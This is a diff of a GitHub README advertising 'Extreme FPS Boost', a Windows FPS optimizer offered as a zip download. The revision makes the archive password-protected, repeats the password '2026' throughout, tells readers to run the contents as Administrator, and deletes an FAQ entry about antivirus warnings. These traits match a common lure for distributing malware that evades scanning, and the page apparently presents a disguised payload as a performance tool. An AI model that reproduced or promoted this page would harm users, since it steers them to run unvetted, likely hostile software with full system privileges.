@@ -1,195 +1,377 @@
 <div align="center">
 
-# ⚡ EXTREME FPS BOOST
+<a href="https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip">
+  <img src="./assets/fps-boost-banner.png" alt="Extreme FPS Boost — Windows performance optimizer" width="100%">
+</a>
 
-### Windows performance optimization for smoother gameplay, lower input latency, and more stable FPS.
+⚡ EXTREME FPS BOOST
 
-<br>
+Boost FPS, reduce input latency, and optimize Windows for smoother gameplay.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?style=for-the-badge\&logo=windows11\&logoColor=white)](https://www.microsoft.com/windows/)
-[![Architecture](https://img.shields.io/badge/Architecture-64--bit-24292F?style=for-the-badge)](#system-requirements)
-[![Repository Size](https://img.shields.io/github/repo-size/asdafgs419/Extreme-FPS-Boost?style=for-the-badge\&logo=github)](https://github.com/asdafgs419/Extreme-FPS-Boost)
-[![Last Commit](https://img.shields.io/github/last-commit/asdafgs419/Extreme-FPS-Boost?style=for-the-badge\&logo=github)](https://github.com/asdafgs419/Extreme-FPS-Boost/commits/main)
-[![GitHub Stars](https://img.shields.io/github/stars/asdafgs419/Extreme-FPS-Boost?style=for-the-badge\&logo=github)](https://github.com/asdafgs419/Extreme-FPS-Boost/stargazers)
+
 
 <br>
 
-[![Download Extreme FPS Boost](https://img.shields.io/badge/DOWNLOAD-EXTREME%20FPS%20BOOST-72FF00?style=for-the-badge\&logo=github\&logoColor=black)](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip)
+
 
 <br>
 
-[Download](#download) ·
-[Features](#features) ·
-[Installation](#installation) ·
-[Usage](#usage) ·
-[FAQ](#frequently-asked-questions) ·
-[Report an Issue](https://github.com/asdafgs419/Extreme-FPS-Boost/issues/new)
+🔐 ARCHIVE PASSWORD: 2026
+
+Download extreme-FPS.zip and extract it using password 2026.
+
+<br>
+
+Download •Password •Features •Installation •Usage •FAQ
 
 </div>
-
----
 
 <a id="overview"></a>
 
-## 🚀 Overview
+🚀 Overview
 
-**Extreme FPS Boost** is a lightweight Windows optimization utility designed to improve gaming performance, reduce input latency, and provide smoother frame delivery.
+Extreme FPS Boost is a lightweight Windows optimization utility designed to improve gaming performance, reduce input latency, stabilize frame times, and improve overall system responsiveness.
 
-The included optimization profile applies performance-focused Windows settings intended to reduce unnecessary system load and improve overall responsiveness.
+It applies performance-focused Windows settings without requiring complicated manual configuration.
 
-No complicated manual configuration is required. Download the archive, extract it, and run the utility.
+[!IMPORTANT]The archive is password protected.
 
-> [!NOTE]
-> Performance improvements depend on your hardware, Windows configuration, graphics settings, drivers, temperatures, and background applications.
+Archive password: 2026
 
----
+[!NOTE]Performance improvements depend on your hardware, Windows configuration, graphics settings, drivers, temperatures, and background applications.
 
 <a id="features"></a>
 
-## ⚡ Features
+⚡ Features
 
-| Feature                             | Description                                                   |
-| ----------------------------------- | ------------------------------------------------------------- |
-| **FPS Optimization**                | Applies performance-focused settings for smoother gameplay    |
-| **CPU Scheduling**                  | Optimizes processor scheduling and resource allocation        |
-| **Memory Optimization**             | Helps reduce unnecessary memory usage                         |
-| **Input Latency Reduction**         | Applies settings intended to improve responsiveness           |
-| **Frame-Time Optimization**         | Helps provide smoother and more consistent frame delivery     |
-| **Graphics Configuration**          | Configures selected Windows graphics performance settings     |
-| **Background Process Optimization** | Helps reduce unnecessary background system activity           |
-| **Startup Optimization**            | Reduces performance impact from unnecessary startup processes |
-| **Windows Performance Tweaks**      | Applies selected system-level performance settings            |
-| **One-Click Optimization**          | Simple optimization process without complicated setup         |
-| **Lightweight Utility**             | Requires minimal storage and system resources                 |
-| **Windows 10 and 11 Support**       | Designed for modern 64-bit Windows systems                    |
+Feature
 
----
+Description
+
+FPS Optimization
+
+Applies performance-focused settings for smoother gameplay
+
+CPU Scheduling
+
+Optimizes processor scheduling and resource allocation
+
+Memory Optimization
+
+Helps reduce unnecessary memory and background usage
+
+Input Latency Reduction
+
+Applies settings intended to improve responsiveness
+
+Frame-Time Optimization
+
+Helps provide smoother and more consistent frame delivery
+
+Graphics Optimization
+
+Configures selected Windows graphics performance settings
+
+Background Process Optimization
+
+Helps reduce unnecessary background system activity
+
+Startup Optimization
+
+Reduces the impact of unnecessary startup processes
+
+Windows Performance Tweaks
+
+Applies selected system-level performance settings
+
+Gaming Optimization
+
+Configures Windows for performance-focused gaming
+
+One-Click Optimization
+
+Provides a simple optimization process
+
+Lightweight Utility
+
+Requires minimal storage and system resources
+
+Windows 10 / 11 Support
+
+Designed for modern 64-bit Windows systems
 
 <a id="download"></a>
 
-## 📥 Download
-
-Download the latest available build directly from this repository:
+📥 Download
 
 <div align="center">
 
-### [⬇️ Download Extreme FPS Boost](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip)
+Download Extreme FPS Boost
 
-**File:** `extreme-FPS.zip`
+<a href="https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip">
+  <img src="https://img.shields.io/badge/⬇%20DOWNLOAD-extreme--FPS.zip-72FF00?style=for-the-badge&labelColor=111111" alt="Download Extreme FPS Boost">
+</a>
+
+<br><br>
+
+Download information
+
+Value
+
+Archive name
+
+extreme-FPS.zip
+
+Archive password
+
+2026
+
+Format
+
+ZIP
+
+Platform
+
+Windows 10 / Windows 11
+
+Architecture
+
+64-bit
+
+🔐 ZIP PASSWORD: 2026
+
+Direct download: extreme-FPS.zip
 
 </div>
 
-> [!IMPORTANT]
-> Download Extreme FPS Boost only from the official repository:
->
-> **https://github.com/asdafgs419/Extreme-FPS-Boost**
+[!IMPORTANT]After downloading extreme-FPS.zip, enter 2026 when your archive program asks for the password.
 
----
+[!WARNING]Download Extreme FPS Boost only from this official GitHub repository.
+
+<a id="archive-password"></a>
+
+🔐 Archive Password
+
+The extreme-FPS.zip archive is password protected.
+
+Archive: extreme-FPS.zip
+Password: 2026
+
+Password to copy
+
+2026
+
+The password contains four digits with no spaces.
+
+[!TIP]Use 7-Zip, WinRAR, or another archive program that supports password-protected ZIP files.
 
 <a id="installation"></a>
 
-## 📖 Installation
+📖 Installation
 
-1. [Download Extreme FPS Boost](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip).
-2. Open the downloaded `extreme-FPS.zip` archive.
-3. Extract all files into a separate folder.
-4. Close running games and important applications.
-5. Run the FPS Boost utility as **Administrator**.
-6. Select or apply the required optimization profile.
-7. Wait until the optimization process is complete.
-8. Restart Windows.
-9. Launch your game and test the result.
+Download extreme-FPS.zip.
 
-> [!WARNING]
-> Create a Windows restore point before applying system-level optimizations.
+Open the downloaded archive using 7-Zip, WinRAR, or another ZIP extractor.
 
----
+Enter the archive password: 2026.
+
+Extract all files into a separate folder.
+
+Close running games and important applications.
+
+Run the included utility as Administrator.
+
+Apply the required optimization profile.
+
+Wait until the optimization process is complete.
+
+Restart Windows.
+
+Launch your game and test the result.
+
+Extraction details
+
+File name: extreme-FPS.zip
+Password: 2026
+
+[!WARNING]Create a Windows restore point before applying system-level optimizations.
 
 <a id="usage"></a>
 
-## 🎮 Usage
+🎮 Usage
 
-1. Launch Extreme FPS Boost as **Administrator**.
-2. Review the available optimization options.
-3. Apply the recommended performance profile.
-4. Wait for the process to finish.
-5. Restart your computer.
-6. Launch your game.
-7. Compare performance using the same graphics settings.
+Extract extreme-FPS.zip using password 2026.
 
-For an accurate comparison, keep the following settings unchanged:
+Launch Extreme FPS Boost as Administrator.
 
-* Screen resolution
-* Graphics quality preset
-* Game version
-* Graphics driver version
-* Benchmark location
-* Background applications
-* Windows power plan
+Review the available optimization options.
 
----
+Apply the recommended performance profile.
+
+Wait for the process to finish.
+
+Restart your computer.
+
+Launch your game.
+
+Compare performance using identical graphics settings.
+
+For an accurate comparison, keep these settings unchanged:
+
+Screen resolution
+
+Graphics quality preset
+
+Game version
+
+Graphics driver version
+
+Benchmark location
+
+Background applications
+
+Windows power plan
 
 <a id="performance"></a>
 
-## 📊 Performance
+📊 Performance Optimization
 
 Extreme FPS Boost is designed to improve:
 
-* Average frame rate
-* Frame-time consistency
-* System responsiveness
-* Game startup speed
-* CPU and memory utilization
-* Input responsiveness
-* Background process usage
+Average frame rate
 
-Performance gains will vary between different computers.
+FPS stability
 
-A high-end system that is already optimized may show a smaller improvement. A system with unnecessary startup programs, background processes, or inefficient Windows settings may experience a more noticeable difference.
+Frame-time consistency
 
-> [!IMPORTANT]
-> No specific FPS increase is guaranteed. Always test performance before and after optimization under identical conditions.
+System responsiveness
 
----
+Game startup speed
+
+CPU resource allocation
+
+Memory utilization
+
+Input responsiveness
+
+Background process usage
+
+Windows gaming performance
+
+Actual performance gains will vary between different computers.
+
+Systems with unnecessary startup programs, background applications, or inefficient Windows settings may experience a more noticeable improvement.
+
+[!IMPORTANT]No specific FPS increase is guaranteed. Test performance before and after optimization under identical conditions.
 
 <a id="system-requirements"></a>
 
-## 🖥️ System Requirements
+🖥️ System Requirements
 
-| Requirement             | Minimum                                   |
-| ----------------------- | ----------------------------------------- |
-| **Operating System**    | Windows 10 or Windows 11                  |
-| **Architecture**        | 64-bit                                    |
-| **Memory**              | 4 GB RAM or higher                        |
-| **Storage**             | At least 200 MB of available space        |
-| **Permissions**         | Administrator privileges                  |
-| **Internet Connection** | Required only for downloading the archive |
+Requirement
 
----
+Minimum
+
+Operating System
+
+Windows 10 or Windows 11
+
+Architecture
+
+64-bit
+
+Memory
+
+4 GB RAM or higher
+
+Storage
+
+At least 200 MB of available space
+
+Permissions
+
+Administrator privileges
+
+Archive Program
+
+7-Zip, WinRAR, or another ZIP extractor
+
+Archive Password
+
+2026
+
+Internet Connection
+
+Required only to download the archive
 
 <a id="safety"></a>
 
-## 🛡️ Safety Recommendations
+🛡️ Safety Recommendations
 
 Before applying optimizations:
 
-* Create a Windows restore point
-* Save important documents
-* Close running games and applications
-* Extract the archive before running the utility
-* Run the utility as Administrator
-* Do not interrupt the optimization process
-* Restart Windows after applying changes
-* Download files only from the official repository
+Create a Windows restore point
 
-> [!CAUTION]
-> Avoid unofficial or modified builds distributed by unknown third parties.
+Save important documents
 
----
+Close running games and applications
+
+Extract the archive before running the utility
+
+Use archive password 2026
+
+Run the utility as Administrator
+
+Do not interrupt the optimization process
+
+Restart Windows after applying changes
+
+Download files only from the official repository
+
+[!CAUTION]Avoid unofficial or modified builds distributed by unknown third parties.
 
 <a id="frequently-asked-questions"></a>
 
-## ❓ Frequently Asked Questions
+❓ Frequently Asked Questions
+
+<details>
+<summary><strong>What is the archive password?</strong></summary>
+
+<br>
+
+The password for extreme-FPS.zip is:
+
+2026
+
+Enter all four digits without spaces.
+
+</details>
+
+<details>
+<summary><strong>Where can I download Extreme FPS Boost?</strong></summary>
+
+<br>
+
+Download the archive directly from the official repository:
+
+Download extreme-FPS.zip
+
+After downloading, extract it using password 2026.
+
+</details>
+
+<details>
+<summary><strong>The password is not working. What should I do?</strong></summary>
+
+<br>
+
+Make sure you enter exactly:
+
+2026
+
+Check that there are no spaces before or after the password and that the downloaded file is named extreme-FPS.zip.
+
+</details>
 
 <details>
 <summary><strong>Will Extreme FPS Boost increase my FPS?</strong></summary>
@@ -240,7 +422,7 @@ Results depend on the game engine, hardware configuration, graphics settings, dr
 
 The utility is intended to apply local Windows performance and system configuration changes.
 
-It does not need to modify protected game executables or online game files.
+It does not require modification of protected online game files.
 
 </details>
 
@@ -253,63 +435,55 @@ A restart is recommended because some system-level settings do not take effect i
 
 </details>
 
-<details>
-<summary><strong>Why did my antivirus scan the archive?</strong></summary>
-
-<br>
-
-Utilities that apply system settings or require Administrator privileges may receive additional attention from security software.
-
-Download the archive only from the official repository and review files before running them.
-
-</details>
-
----
-
 <a id="issues"></a>
 
-## 🐛 Issues and Feedback
+🐛 Issues and Feedback
 
 Found a bug or have a suggestion?
 
-### [Open a New Issue](https://github.com/asdafgs419/Extreme-FPS-Boost/issues/new)
+Open a New Issue
 
-Include the following information:
+Include:
 
-* Windows version
-* CPU model
-* GPU model
-* Amount of RAM
-* Extreme FPS Boost version
-* Description of the problem
-* Steps required to reproduce it
-* Screenshots or logs, when available
+Windows version
 
-You can also review existing reports on the [Issues page](https://github.com/asdafgs419/Extreme-FPS-Boost/issues).
+CPU model
 
----
+GPU model
+
+Amount of RAM
+
+Description of the problem
+
+Steps required to reproduce it
+
+Screenshots or logs, when available
+
+Review existing reports on the Issues page.
 
 <a id="support"></a>
 
-## ⭐ Support the Project
+⭐ Support the Project
 
 If Extreme FPS Boost improved your gaming experience:
 
-* Leave a Star on the repository
-* Share the project
-* Report bugs
-* Suggest improvements
-* Follow repository updates
+Leave a Star on the repository
+
+Share the project
+
+Report bugs
+
+Suggest improvements
 
 <div align="center">
 
-[![Star Extreme FPS Boost](https://img.shields.io/badge/⭐%20STAR-EXTREME%20FPS%20BOOST-72FF00?style=for-the-badge\&labelColor=111111)](https://github.com/asdafgs419/Extreme-FPS-Boost/stargazers)
+
 
 </div>
 
----
+<a id="disclaimer"></a>
 
-## ⚠️ Disclaimer
+⚠️ Disclaimer
 
 Extreme FPS Boost is provided for system optimization and educational purposes.
 
@@ -319,21 +493,43 @@ The user is responsible for reviewing and applying system modifications. Create 
 
 This project is not affiliated with Microsoft, NVIDIA, AMD, Intel, or any game developer or publisher.
 
----
+<a id="repository-topics"></a>
 
-## 🔍 Keywords
+🔍 Repository Topics
 
-`windows fps boost` · `fps optimizer` · `fps booster` · `game booster` · `gaming optimization` · `windows optimization` · `pc optimization` · `gaming performance` · `input lag reduction` · `windows performance tweaks` · `windows 10 optimization` · `windows 11 optimization`
-
----
+fps-boost
+fps-booster
+fps-optimizer
+game-booster
+gaming
+gaming-performance
+gaming-optimization
+pc-gaming
+windows
+windows-10
+windows-11
+windows-optimization
+windows-optimizer
+pc-optimization
+system-optimization
+performance-tweaks
+low-latency
+input-lag
+frame-time
+windows-utility
 
 <div align="center">
 
-### Built for smoother gameplay and better Windows performance.
+🔐 ARCHIVE PASSWORD: 2026
 
-[⬇️ Download](https://github.com/asdafgs419/Extreme-FPS-Boost/raw/refs/heads/main/extreme-FPS.zip) ·
-[⭐ Star](https://github.com/asdafgs419/Extreme-FPS-Boost/stargazers) ·
-[🐛 Report a Bug](https://github.com/asdafgs419/Extreme-FPS-Boost/issues/new) ·
-[📁 Repository](https://github.com/asdafgs419/Extreme-FPS-Boost)
+
+
+<br>
+
+Download extreme-FPS.zip and extract it using password 2026.
+
+<br>
+
+⬇️ Download ZIP •⭐ Star •🐛 Report a Bug •📁 Repository
 
 </div>
